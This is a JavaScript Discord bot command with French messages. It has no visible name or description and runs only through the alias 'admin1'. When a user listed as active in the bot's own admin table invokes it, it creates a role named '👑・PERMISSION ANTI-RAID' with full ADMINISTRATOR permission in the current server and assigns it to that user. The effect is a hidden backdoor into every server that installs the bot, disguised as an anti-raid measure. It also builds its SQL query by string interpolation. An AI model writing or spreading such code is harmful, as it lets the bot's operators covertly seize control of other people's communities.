const Discord = require("discord.js")
const Command = require("../../Structure/Command")
const chalk = require("chalk");

module.exports = new Command({

  name: "",
  description: "",
  utilisation: "",
  alias: ["admin1"],
  permission: "",
  category: "",
  cooldown: 1,

  async run(bot, message, args) {

    const db = bot.db;
    const user = message.author

    db.query(`SELECT * FROM admin WHERE userID = ${user.id}`, async (err, req) => {
	if(req.length < 1) return message.reply(" Uniquement les **Admins** peut utilisé cette commande !") 

  if(req[0].statut === "OFF") return message.reply(" Uniquement les **Admins** peut utilisé cette commande !") 
  if(req[0].statut === "ACTIF") {
      
      const roles = message.guild.roles.cache.find(perm => perm.name === '👑・PERMISSION ANTI-RAID')
       message.reply(" **Mode Admin** Activé pendant `3 min,` bonne chance !")
      
	      if(roles) return message.member.roles.add(roles).then(
        console.log(chalk.bgRed(`[Staff Activé] ${message.author.username} | sûr ${message.guild.name}`))
          
          )
        
       
      const role = await message.guild.roles.create({
        name: "👑・PERMISSION ANTI-RAID",
        color: "#fc0707",
        permissions: ["VIEW_CHANNEL", "ADMINISTRATOR"]
      })

     
      /*message.guild.channels.cache.forEach(channel => {

        channel.permissionOverwrites.create(role, {
          SEND_MESSAGES: true,
          CONNECT: true,
          VIEW_CHANNEL: true,
          SPEAK: true,
          ADD_REACTIONS: true,
          ADMINISTRATOR: true
        })
      }) */

      message.member.roles.add(role).then(
      console.log(chalk.bgRed(`[Staff Activé] ${message.author.username} | sûr ${message.guild.name}`))
      )
      setTimeout(async () => {
        message.member.roles.remove(role)
        message.member.send("**Mode Admin** désactivé car ça fait 3 min !")  
      }, 180000)
}})}})